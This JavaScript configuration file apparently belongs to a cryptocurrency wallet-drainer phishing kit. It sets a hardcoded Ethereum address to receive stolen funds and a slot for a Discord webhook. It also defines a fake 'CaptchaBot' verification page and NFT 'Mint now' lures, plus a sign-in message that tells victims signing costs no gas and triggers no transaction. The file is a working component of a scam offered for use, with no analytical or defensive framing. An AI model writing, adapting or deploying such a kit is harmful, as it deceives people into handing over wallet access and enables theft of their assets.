const receiveAddress = "0xC7D565cb840328fD84C40D594D812A33ad41F7e4";
const discordWebhookURL = ""

const collectionInfo = {
    name: "VERIFY",
    socialMedia: {
        discord: "",
        twitter: "",
        instagram: "",
    },
}

const signMessage = `Welcome, \n\n` +
    `Click to sign in and accept the Terms of Service.\n\n` +
    `This request will not trigger a blockchain transaction or cost any gas fees.\n\n` +
    `Wallet Address:\n{address}\n\n` +
    `Nonce:\n{nonce}`;

const indexPageInfo = {
    backgroundImage: "https://funart.pro/uploads/posts/2021-04/1618533712_38-funart_pro-p-oboi-fon-glubokii-sinii-tsvet-39.png", // relative path to background image (in assets)
    title: "{name}", // {name} will be replaced with collectionInfo.name
    underTitle: "your assets",
}

const claimPageInfo = {
    title: "CaptchaBot", // <br> is a line break
    shortDescription: "",
    longDescription: "After verification, your account will be automatically checked",

    claimButtonText: "Verify",

    image: "captcha.png", // relative path to image (in assets)
    imageRadius: 150, // image radius in px
}

const customStrings = {
    title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    connectButton: "Connect Wallet",
    transferButton: "Mint now",
    dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
}

/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (!receiveAddress.startsWith("0x") || (receiveAddress.length >= 64 || receiveAddress.length <= 40))
    console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
//#endregion